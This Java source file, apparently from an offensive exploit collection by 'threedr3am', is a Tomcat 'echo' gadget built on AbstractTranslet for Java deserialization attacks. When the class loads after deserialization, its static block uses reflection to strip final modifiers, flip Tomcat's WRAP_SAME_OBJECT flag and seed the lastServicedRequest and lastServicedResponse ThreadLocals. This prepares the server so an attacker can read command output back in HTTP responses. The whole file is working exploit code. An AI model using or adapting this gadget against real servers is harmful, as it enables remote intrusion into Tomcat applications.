import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

/**
 * 基于tomcat的半通用回显
 *
 * @author threedr3am
 */
public class TomcatEchoInject  extends AbstractTranslet {

  static {
    try {
      /*刚开始反序列化后执行的逻辑*/
      //修改 WRAP_SAME_OBJECT 值为 true
      java.lang.Class c = java.lang.Class.forName("org.apache.catalina.core.ApplicationDispatcher");
      java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
      java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");
      modifiersField.setAccessible(true);
      modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
      f.setAccessible(true);
      if (!f.getBoolean(null)) {
        f.setBoolean(null, true);
      }

      //初始化 lastServicedRequest
      c = java.lang.Class.forName("org.apache.catalina.core.ApplicationFilterChain");
      f = c.getDeclaredField("lastServicedRequest");
      modifiersField = f.getClass().getDeclaredField("modifiers");
      modifiersField.setAccessible(true);
      modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
      f.setAccessible(true);
      if (f.get(null) == null) {
        f.set(null, new ThreadLocal());
      }

      //初始化 lastServicedResponse
      f = c.getDeclaredField("lastServicedResponse");
      modifiersField = f.getClass().getDeclaredField("modifiers");
      modifiersField.setAccessible(true);
      modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
      f.setAccessible(true);
      if (f.get(null) == null) {
        f.set(null, new ThreadLocal());
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  @Override
  public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

  }

  @Override
  public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
      throws TransletException {

  }
}
